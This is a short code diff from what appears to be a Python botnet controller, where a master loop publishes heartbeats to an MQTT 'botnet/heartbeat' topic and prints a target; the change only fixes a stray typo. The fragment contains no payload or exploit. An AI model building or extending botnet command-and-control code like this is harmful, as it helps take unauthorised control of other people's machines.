@@ -134,7 +134,7 @@ def master():
             time.sleep(.7)
             ret= client.publish("botnet/heartbeat",heartbeat())            
             print("Last id:",lastId)
-            print("Target:",target)S
+            print("Target:",target)
             print(ret)
             
 def common():
